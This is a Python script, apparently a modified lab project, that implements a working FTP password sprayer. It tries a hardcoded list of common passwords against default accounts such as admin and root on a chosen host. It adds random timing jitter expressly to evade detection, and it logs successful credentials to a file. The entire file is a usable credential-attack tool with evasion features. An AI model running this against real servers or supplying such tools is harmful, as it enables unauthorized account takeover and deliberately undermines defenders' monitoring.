#!/usr/bin/env python3
"""
Project #7 (Modified): Stealth-Enhanced FTP Password Sprayer
Features: Dynamic timing jitter, horizontal spraying architecture, cleartext alert.
"""

import os
import sys
import time
import random
import argparse
from ftplib import FTP, error_perm, error_reply

BANNER = """
======================================================================
  MODIFIED MODULE: STEALTH-ENHANCED PASSWORD SPRAYER
  Acknowledged Weaknesses: Timing patterns, sequential footprints.
  Mitigations: Random jitter, horizontal spraying across accounts.
======================================================================
"""

DEFAULT_PASSWORDS = ["password123", "admin", "123456", "Welcome2026!"]
DEFAULT_USERS = ["abdul","admin", "root", "ftp", "user", "guest", "sysadmin", "backup"]

def spray_ftp(host, port, usernames, passwords, base_delay):
    print(BANNER)
    print(f"[*] Targeting: {host}:{port}")
    print(f"[*] Attack Pattern: Horizontal Spray (Stealth Mode)")
    print(f"[*] Testing {len(passwords)} password(s) across {len(usernames)} users.")
    print(f"[*] Base delay configured: {base_delay}s\n")

    if port == 21:
        print("⚠️  [NET-WARN] Target uses port 21 (Cleartext FTP).")
        print("   All attempts are fully visible to network sniffers/NDR tools.\n")

    # HORIZONTAL SPRAYING: Loop through passwords first, then users
    for password in passwords:
        password = password.strip()
        if not password:
            continue
            
        print(f"--- Starting Spray Cycle for Password: [{password}] ---")
        
        for user in usernames:
            user = user.strip()
            if not user:
                continue

            # IMPLEMENTING JITTER: Break predictable timing intervals
            # Adds a random float variance between 0.2 and 1.8 seconds to the base delay
            actual_delay = base_delay + random.uniform(0.2, 1.8)
            
            print(f"[THROTTLE] Waiting {actual_delay:.2f}s to break timing analytics...")
            time.sleep(actual_delay)

            print(f"[ATTEMPT] {user}:{password} -> ", end="", flush=True)
            
            ftp = FTP()
            try:
                ftp.connect(host, port, timeout=5)
                ftp.login(user=user, passwd=password)
                
                print("🎉 230 Login successful!")
                with open("ftp_hit.txt", "a") as f:
                    f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {host} -> {user}:{password}\n")
                ftp.quit()
                
                # Keep going to find all weak accounts using this credential
                continue

            except error_perm as ep:
                err_msg = str(ep).split('\n')[0]
                print(f"❌ {err_msg}")
                try:
                    ftp.quit()
                except:
                    pass
            except (error_reply, BrokenPipeError, ConnectionRefusedError):
                print("⚠️ Connection dropped. Adjusting jitter backoff...")
                time.sleep(5)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Stealth FTP Password Sprayer")
    parser.add_argument("--host", required=True, help="Target FTP server")
    parser.add_argument("--port", type=int, default=21, help="FTP Port")
    parser.add_argument("--delay", type=float, default=1.0, help="Base delay before jitter math")
    args = parser.parse_args()

    try:
        spray_ftp(args.host, args.port, DEFAULT_USERS, DEFAULT_PASSWORDS, args.delay)
    except KeyboardInterrupt:
        print("\n[!] Exiting simulation gracefully.")
        sys.exit(0)